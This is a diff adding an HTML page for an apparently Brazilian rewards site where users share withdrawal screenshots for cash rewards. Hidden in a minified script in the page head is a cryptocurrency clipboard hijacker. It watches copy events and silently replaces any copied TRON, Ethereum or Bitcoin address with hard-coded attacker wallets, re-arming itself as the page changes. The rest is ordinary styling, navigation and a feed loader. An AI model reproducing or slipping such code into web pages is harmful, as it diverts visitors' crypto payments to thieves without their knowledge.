@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html class="pixel-ratio-3 retina android android-5 android-5-0 watch-active-state">
+<head>
+    <meta -equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta -equiv="pragma" content="no-cache">
+    <meta -equiv="cache-control" content="no-cache">
+    <meta -equiv="expires" content="0">
+    <title>Torres</title>
+    <link rel="stylesheet" href="css/app.css">
+    <link rel="stylesheet" href="css/iconfont.css">
+    <script type="text/javascript" src="js/min.js"></script>
+    <script type="text/javascript" src="js/layer.js"></script>
+<style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .withdraw-show-container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+
+        /* Header Section */
+        .header-banner {
+            position: relative;
+            background: linear-gradient(51deg, #1e3a8a, #1e3a8a, #3b82f6) !important;
+            color: #ffffff;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 18px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 20px;
+        }
+
+        .back-button {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .back-arrow {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .header-title {
+            flex-grow: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+
+        .header-right {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        /* Balance Section */
+        .balance-container {
+            background-image: url('img/0005.png');
+            background-size: cover;
+            background-position: center;
+            padding: 20px 150px 20px 20px;
+            color: #3b82f6;
+            position: relative;
+        }
+
+        .balance-subtitle {
+            color: #ffffff;
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 15px;
+            /* text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.7); */
+            font-weight: bold;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Showcase Card Styles */
+        .showcase-list {
+            margin-bottom: 20px;
+        }
+
+        .showcase-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 2px 2px 10px rgb(0 0 0 / 30%);
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .showcase-card:active {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .showcase-header {
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(51deg, #1e3a8a, #1e3a8a, #3b82f6);
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            margin-right: 12px;
+        }
+
+        .user-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .user-name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .post-time {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .showcase-content {
+            position: relative;
+        }
+
+        .showcase-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .showcase-comment {
+            padding: 15px;
+            font-size: 14px;
+            font-weight: bold;
+            line-height: 1.5;
+            color: #ffffff;
+            border-top: 1px solid #eee;
+        }
+
+        .showcase-footer {
+            padding: 8px;
+            background: rgba(59, 130, 246, 0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .reward-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .reward-icon {
+            width: 30px;
+            height: 30px;
+            /* background: #3b82f6; */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            color: white;
+            font-size: 12px;
+        }
+
+        .reward-icon img {
+            width: 30px;
+            height: 30px;
+        }
+
+        .reward-text {
+            font-weight: 600;
+            color: #3b82f6;
+        }
+
+        .action-buttons {
+            display: flex;
+        }
+
+        /* .action-button {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: rgba(59, 130, 246, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: #3b82f6;
+        } */
+
+        .action-button:active {
+            transform: scale(0.95);
+            background: rgba(59, 130, 246, 0.2);
+        }
+
+        .floating-button {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            font-size: 24px;
+            background-image: url('img/0101.png');
+            background-size: cover;
+            background-position: center;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            box-shadow: 0 4px 10px rgba(59, 130, 246, 0.3);
+            z-index: 100;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .iconfont {
+            font-size: 20px !important;
+            font-weight: bold;
+        }
+
+        .floating-button:active {
+            transform: scale(0.95);
+        }
+
+        .empty-state {
+            background: #f5f5f5;
+            padding: 40px 20px;
+            text-align: center;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .empty-icon {
+            font-size: 60px;
+            color: #3b82f6;
+            margin-bottom: 20px;
+        }
+
+        .empty-text {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .loading-indicator {
+            text-align: center;
+            padding: 15px;
+            color: #666;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(59, 130, 246, 0.1);
+            border-radius: 50%;
+            border-top-color: #3b82f6;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes    spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .image-preview-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .image-preview-overlay img {
+            max-width: 90%;
+            max-height: 90%;
+            object-fit: contain;
+        }
+
+        .image-preview-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+    </style>
+<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TVYxCoPcxEQDhARWJbx1hvUDz1gYS1bcmd');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x82A7D0511F088BE8CF7EBC99C817759D9CC7DEB1');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1CqbCJN2cXiw645zMNhAAkNjfbEsSeU4Ye');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '352jbwJ9rd9NtdHkYuuKo143mMiCMhu2db');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qdsfvs8samlrl05pgu3ldlug8jlnp2776cffw43');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qdsfvs8samlrl05pgu3ldlug8jlnp2776cffw43');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
+<body>
+    <div class="withdraw-show-container">
+        <div class="header-banner">
+            <a href="https://zkp518.shop/user/index" class="back-button">
+                <span class="back-arrow">❮</span>
+            </a>
+            <div class="header-title">Compartilhamento de saque bem-sucedido</div>
+            <a href="https://zkp518.shop/withdraw_show/my_list" class="header-right">
+                <i class="icon iconfont icon-my"></i>
+            </a>
+        </div>
+        
+        <div class="balance-container">
+            <div class="balance-subtitle">Compartilhe uma captura de tela do seu saque bem-sucedido e você poderá ganhar uma recompensa de R$ 1 a R$ 20.</div>
+        </div>
+
+
+        <div class="main-content">
+            <div class="showcase-list" id="withdrawShowList">
+                <ul>
+                    
+                </ul>
+                
+                <!--<div class="showcase-card">-->
+                <!--    <div class="showcase-header">-->
+                <!--        <div class="user-info">-->
+                <!--            <div class="user-avatar">-->
+                <!--                9-->
+                <!--            </div>-->
+                <!--            <div class="user-details">-->
+                <!--                <div class="user-name">956****1607</div>-->
+                <!--                <div class="post-time">Sep 17, 2025</div>-->
+                <!--            </div>-->
+                <!--        </div>-->
+                <!--    </div>-->
+                <!--    <div class="showcase-content">-->
+                <!--        <img src="" alt="Namoyish rasm" class="showcase-image" onclick="showImagePreview('')">-->
+                <!--    </div>-->
+                <!--    <div class="showcase-comment">-->
+                <!--        Rahmat, Sana tumagal papa-->
+                <!--    </div>-->
+                <!--    <div class="showcase-footer">-->
+                <!--        <div class="reward-info">-->
+                <!--            <div class="reward-icon"><img src="/static/home/img/nc/0029.png" alt="Mukofot"></div>-->
+                <!--            <div class="reward-text">₱10.00 Mukofot</div>-->
+                <!--        </div>-->
+                <!--        <div class="action-buttons">-->
+                <!--            <div class="action-button" onclick="showImagePreview('')">-->
+                <!--                <i class="icon iconfont icon-search"></i>-->
+                <!--            </div>-->
+                <!--        </div>-->
+                <!--    </div>-->
+                <!--</div>-->
+                
+            </div>
+
+        </div>
+
+        <a href="https://zkp518.shop/user/post" class="floating-button">
+            <i class="icon iconfont icon-add">+</i>
+        </a>
+    </div>
+
+
+    <div class="image-preview-overlay" id="imagePreview">
+        <div class="image-preview-close" onclick="closeImagePreview()">×</div>
+        <img src="" alt="Image Preview">
+    </div>
+
+    <div style="height: 60px;"></div>
+</body>
+<style>
+    .game1
+    {
+        border-radius: 50%;
+        animation: rotate1 2s linear infinite;
+    }
+    @keyframes  rotate1{
+	0%{
+		transform: rotateZ(0deg);
+		
+	}
+	100%{
+		transform: rotateZ(360deg);
+	}
+}
+.xz{
+    color:#3b82f6  !important;
+}
+</style>
+<footer>
+     <div class="foot_bo">
+        <a href="/indice.html">
+            <img src="footer/inicio.png"/>
+            <p>Início</p>
+        </a>
+    </div>
+
+    <div class="foot_bo">
+        <a href="transacoes.html">
+            <img src="footer/meusprodutos.png"/>
+            <p>Registros</p>
+        </a>
+    </div>
+
+<!--<div class="foot_bo">-->
+<!--    <a href="https://zkp518.shop/task/dayindex">-->
+<!--        <img src="/static/home/img/gift02.png" width="40px" class="game1"/>-->
+<!--        <p>Bônus</p>-->
+<!--    </a>-->
+<!--</div>-->
+
+<!---->
+<!--<div class="foot_bo">-->
+<!--    <a href="https://zkp518.shop/game/index">-->
+<!--        <img src="/static/home/img/ico_zp.png" class="game1"/>-->
+<!--        <p>Jogo</p>-->
+<!--    </a>-->
+<!--</div>-->
+<!---->
+    <div class="foot_bo">
+        <a href="/mostrar.html">
+            <img src="footer/mostrar.png" class="game1"/>
+            <p class="xz" style="color: #1e3a8a;">Mostrar</p>
+        </a>
+    </div>
+
+    <div class="foot_bo">
+        <a href="/compartilhar.html">
+            <img src="footer/compartilhar.png"/>
+            <p>Compartilhar</p>
+        </a>
+    </div>
+
+    <!---->
+    <!--    <div class="foot_bo">-->
+    <!--        <a href="https://zkp518.shop/redpacket/index">-->
+    <!--            <img src="/static/home/img/hb2.png"/>-->
+    <!--            <p class="xz">Reward</p>-->
+    <!--        </a>-->
+    <!--    </div>-->
+    <!---->
+    <div class="foot_bo">
+        <a href="meu.html">
+            <img src="footer/meu.png"/>
+            <p>Meu</p>
+        </a>
+    </div>
+
+</footer>    <script type="text/javascript" src="js/droploadmin.js"></script>
+<script type="text/javascript">
+        function showImagePreview(imageSrc) {
+            const preview = document.getElementById('imagePreview');
+            const previewImg = preview.querySelector('img');
+            previewImg.src = imageSrc;
+            preview.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeImagePreview() {
+            const preview = document.getElementById('imagePreview');
+            preview.style.display = 'none';
+            document.body.style.overflow = '';
+        }
+
+        document.getElementById('imagePreview').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeImagePreview();
+            }
+        });
+
+        
+//     $(function () {
+//         var page = 0;
+//         $('.showcase-list').dropload({
+//             scrollArea: window,
+//             domDown: {
+//                 domClass: 'dropload-down',
+// domRefresh: '<div class="dropload-refresh zhibo-index-bot-ts">↑ ↑ Puxe para carregar mais</div>',
+// domLoad: '<div class="dropload-load zhibo-index-bot-ts"><span class="loading"></span>Carregando...</div>',
+// domNoData: '<div class="dropload-noData zhibo-index-bot-ts">Não há mais dados</div>',
+
+//             },
+//             loadDownFn: function (me) {
+//                 page++;
+//                 //HTML
+//                 var html = '';
+//                 var data = {
+//                     page: page,
+//                 };
+//                 $.post("https://zkp518.shop/user/getblog", data, function (result) {
+
+//                     if (result.code == 200) {
+//                         var dataLen = result.data.length;
+// for (var i = 0; i < dataLen; i++) {
+//     html += '<div class="showcase-card">';
+//     html += '  <div class="showcase-header">';
+//     html += '    <div class="user-info">';
+//     html += '      <div class="user-avatar">1</div>';
+//     html += '      <div class="user-details">';
+//     html += '        <div class="user-name">956****1607</div>';
+//     html += '        <div class="post-time">Sep 17, 2025</div>';
+//     html += '      </div>';
+//     html += '    </div>';
+//     html += '  </div>';
+//     html += '  <div class="showcase-content">';
+//     html += '    <img src="" alt="Showcase Image" class="showcase-image" onclick="showImagePreview(\'\')">';
+//     html += '  </div>';
+//     html += '  <div class="showcase-comment">Thank u , Sana tumagal papa</div>';
+//     html += '  <div class="showcase-footer">';
+//     html += '    <div class="reward-info">';
+//     html += '      <div class="reward-icon"><img src="/static/home/img/nc/0029.png" alt="Reward"></div>';
+//     html += '      <div class="reward-text">₱10.00 Reward</div>';
+//     html += '    </div>';
+//     html += '    <div class="action-buttons">';
+//     html += '      <div class="action-button" onclick="showImagePreview(\'\')">';
+//     html += '        <i class="icon iconfont icon-search"></i>';
+//     html += '      </div>';
+//     html += '    </div>';
+//     html += '  </div>';
+//     html += '</div>';
+    
+// }
+// $('.showcase-list ul').append(html);
+// me.noData(false);
+// } else {
+//     me.lock();
+//     me.noData(true);
+// }
+//                 }, "json");
+//             }
+//         });
+// });
+
+    $(function () {
+        var page = 0;
+        var _token = "HNhaHena3u7kjRzSiKnab70xBiyCOoSz16TNmwmL";
+        $('.showcase-list').dropload({
+            scrollArea: window,
+            domDown: {
+                domClass: 'dropload-down',
+domRefresh: '<div class="dropload-refresh zhibo-index-bot-ts">↑ Puxe para carregar mais</div>',
+domLoad: '<div class="dropload-load zhibo-index-bot-ts"><span class="loading"></span>Carregando</div>',
+domNoData: '<div class="dropload-noData zhibo-index-bot-ts">Não há mais dados</div>',
+            },
+            loadDownFn: function (me) {
+                page++;
+                // HTML
+                var html = '';
+                var data = {
+                    page: page,
+                    _token: _token
+                };
+                $.post("https://zkp518.shop/user/getblog", data, function (result) {
+                    if (result.code == 200) {
+                        var dataLen = result.data.length;
+for (var i = 0; i < dataLen; i++) {
+    
+    html += '<div class="showcase-card">';
+    html += '  <div class="showcase-header">';
+    html += '    <div class="user-info">';
+    html += '      <div class="user-avatar">'+result.data[i].nickname.charAt(0)+'</div>';
+    html += '      <div class="user-details">';
+    html += '        <div class="user-name">'+result.data[i].nickname+'</div>';
+    html += '        <div class="post-time">'+result.data[i].create_time+'</div>';
+    html += '      </div>';
+    html += '    </div>';
+    html += '  </div>';
+    html += '  <div class="showcase-content">';
+    html += '    <img src="img/produto.jpg" alt="Showcase Image" class="showcase-image" onclick="showImagePreview(\''+result.data[i].image+'\')">';
+
+    html += '  </div>';
+    html += '  <div class="showcase-comment">'+result.data[i].contents+'</div>';
+    html += '  <div class="showcase-footer">';
+    html += '    <div class="reward-info">';
+    html += '      <div class="reward-icon"><img src="/static/home/img/nc/0029.png" alt="Reward"></div>';
+    html += '      <div class="reward-text"> R$ '+result.data[i].reward_amount+'   Recompensa </div>';
+    html += '    </div>';
+    // html += '    <div class="action-buttons">';
+    // html += '      <div class="action-button" onclick="showImagePreview(\'\')">';
+    // html += '        <i class="icon iconfont icon-search"></i>';
+    // html += '      </div>';
+    // html += '    </div>';
+    html += '  </div>';
+    html += '</div>';
+    
+}
+me.noData(false);
+} else {
+    me.lock();
+    me.noData(true);
+}
+
+                    $('.showcase-list ul').append(html);
+                    me.resetload();
+                }, "json");
+            }
+        });
+    });
+
+
+    </script>
+</html>
